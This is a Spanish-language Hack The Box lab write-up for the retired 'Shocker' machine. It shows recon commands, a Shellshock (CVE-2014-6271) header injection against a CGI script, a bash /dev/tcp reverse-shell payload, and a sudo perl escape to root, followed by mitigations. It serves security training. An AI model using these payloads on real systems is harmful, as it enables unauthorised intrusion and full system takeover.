---
machine: Shocker
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, shellshock, cve-2014-6271, cgi, sudo, perl, gtfobins]
---

# Shocker — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Apache con CGI y un script en Bash (`/cgi-bin/user.sh`) que ejecuta `uptime`: el entorno del script se construye con las cabeceras HTTP, así que **Shellshock (CVE-2014-6271)** da ejecución de comandos como `www-data`/`shelly`. La escalada es un `sudo` sin contraseña sobre `perl`, es decir, un escape de GTFOBins.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
80/tcp   open  http  Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh   OpenSSH 7.2p2 Ubuntu
```

```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x sh,pl,cgi
```

```text
/cgi-bin/            (Status: 403)
/cgi-bin/user.sh     (Status: 200)
```

```bash
curl -s http://<IP>/cgi-bin/user.sh
```

```text
Content-Type: text/plain

Just an uptime test script
 04:48:11 up 15:15, 0 users, load average: 0.05, 0.45, 0.39
```

## Acceso

1. **Comprobar la vulnerabilidad** inyectando una función vacía en una cabecera:

```bash
curl -H 'User-Agent: () { :; }; echo; echo VULNERABLE' http://<IP>/cgi-bin/user.sh
```

2. **Shell inversa** con el mismo patrón:

```bash
nc -lvnp 4444
curl -H 'User-Agent: () { :; }; /bin/bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"' \
  http://<IP>/cgi-bin/user.sh
```

También sirve el script de Nmap:

```bash
nmap -sV -p80 --script http-shellshock \
  --script-args uri=/cgi-bin/user.sh,cmd='id' <IP>
```

```text
shelly@Shocker:/usr/lib/cgi-bin$
```

## Escalada

```bash
sudo -l
```

```text
User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

Escape clásico de GTFOBins:

```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
```

```text
root@Shocker:~# id
uid=0(root) gid=0(root) groups=0(root)
```

## Tropiezos

- **`/cgi-bin/` da 403**: el listado está deshabilitado, pero el script concreto (`user.sh`) responde 200.
- **Cabecera correcta**: Shellshock se dispara en cualquier variable de entorno; si `User-Agent` no funciona, probar `Referer` o `Cookie`.
- **Comillas**: la carga va entre comillas simples en `curl` para que Bash local no la interprete.
- **`perl` con `sudo`**: no hace falta shell script; `exec` dentro del intérprete es suficiente.

## Lecciones

- Bash sin parchear + CGI es ejecución remota de comandos: la cabecera es el vector.
- `sudo` sobre un intérprete (perl, python, ruby) es root, igual que sobre un editor.
- Mitigación: actualizar Bash, evitar CGI, y reglas `sudo` que no permitan intérpretes.
